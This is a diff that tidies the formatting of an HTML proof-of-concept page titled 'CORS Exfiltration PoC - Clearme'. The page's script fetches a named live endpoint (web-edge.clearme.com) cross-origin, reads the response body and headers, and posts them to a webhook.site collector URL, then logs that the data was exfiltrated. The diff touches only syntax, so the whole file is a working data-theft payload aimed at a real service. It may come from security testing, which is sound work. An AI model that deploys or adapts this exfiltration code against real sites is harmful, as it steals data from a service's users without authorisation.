@@ -1,12 +1,8 @@
-<!DOCTYPE html>
-  <html lang="en‑Pages, and the console error will disappear.
-
-  ```html
-  <!DOCTYPE html>
+ <!DOCTYPE html>
   <html lang="en">
   <head>
   <meta charset="UTF-8">
-  <title>CORS Exfiltration PoC – Clearme</title>
+  <title>CORS Exfiltration PoC - Clearme</title>
   <style>
     body {font-family:Arial,Helvetica,sans-serif; margin:2rem;}
     pre {background:#f4f4f4; padding:1rem; border:1px solid #ddd;
@@ -30,7 +26,7 @@
     const TARGET_URL   = 'https://web-edge.clearme.com/';          // 
   endpoint to test
     const COLLECTOR    =
-  'https://webhook.site/9b73a4e3-5b36-4493-9eaa-f81197d7f937'; // ← YOUR 
+  'https://webhook.site/9b73a4e3-5b36-4493-9eaa-f81197d7f937'; // <-- YOUR
   webhook URL
     // ---------------------------------------------------------------
 
@@ -48,22 +44,22 @@
       mode: 'cors'
     })
     .then(response => {
-      log(`[+] Request to ${TARGET_URL}`);
-      log(`    Status: ${response.status}`);
-      log(`    Headers: 
-  ${JSON.stringify([...response.headers.entries()])}`);
+      log('[+] Request to ' + TARGET_URL);
+      log('    Status: ' + response.status);
+      log('    Headers: ' +
+  JSON.stringify([...response.headers.entries()]));
       // Try to read the body as text (fallback to empty string on error)
       return response.text().then(text => ({status: response.status, body:
   text}));
     })
     .then(({status, body}) => {
-      log(`    Response Body (first 500 chars):\n${body.substring(0, 
-  500)}`);
+      log('    Response Body (first 500 chars):\n' + body.substring(0,
+  500));
       // Build the payload to send to the collector
       const payload = {
         url: TARGET_URL,
-        status,
-        body   // you could trim this if the body is huge
+        status: status,
+        body: body   // you can trim this if the body is huge
       };
       // Send the data to your webhook collector
       return fetch(COLLECTOR, {
@@ -77,7 +73,7 @@
       log('[+] Data successfully exfiltrated to webhook.site');
     })
     .catch(err => {
-      log(`[-] Error: ${err}`);
+      log('[-] Error: ' + err);
       // Even if something went wrong, we still show that the browser 
   allowed the request
       log('Nevertheless, the browser permitted the cross‑origin request 
